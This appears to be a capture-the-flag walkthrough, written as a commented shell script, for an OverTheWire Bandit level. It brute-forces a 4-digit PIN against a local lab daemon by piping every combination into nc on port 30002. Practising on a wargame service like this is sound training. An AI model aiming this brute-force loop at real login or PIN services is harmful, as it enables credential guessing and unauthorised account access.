#!/bin/sh
# Level Goal: A daemon is listening on port 30002 and will give you the
# password for bandit25 if given the password for bandit24 and a secret
# numeric 4-digit pincode. There is no way to retrieve the pincode except
# by going through all of the 10000 combinations, called brute-forcing.
# You do not need to create new connections each time

# Connect to port 30002
nc localhost 30002
# -> I am the pincode checker for user bandit25. Please enter the password
# -> for user bandit24 and the secret pincode
1234
# -> Wrong! Please enter the correct current password and pincode. Try again.

# Change to temp directory and create file
cd /tmp/my-temp-folder
nano bruteforce.sh
# Create script that contains the following code
# #!/bin/sh
# i=1
# while [ $i -le 9999 ]; do
#   if [ $i -lt 10 ]
#   then
#     echo "bandit24password 000${i}"
#   elif [ $i -lt 100 ]
#   then
#     echo "bandit24password 00${i}"
#   elif [ $i -lt 1000 ]
#   then
#     echo "bandit24password 0${i}"
#   else
#     echo "bandit24password ${i}"
#   fi 
#   i=$((i + 1))
# done

# Give the file execute permission
chmod u+x bruteforce.sh

# Pipe the output of the file to the port
./bruteforce.sh | nc localhost 30002
# -> Wrong! Please enter the correct current password and pincode. Try again.
# -> ...
# -> Wrong! Please enter the correct current password and pincode. Try again.
# -> Correct!
# -> The password of user bandit25 is bandit25password
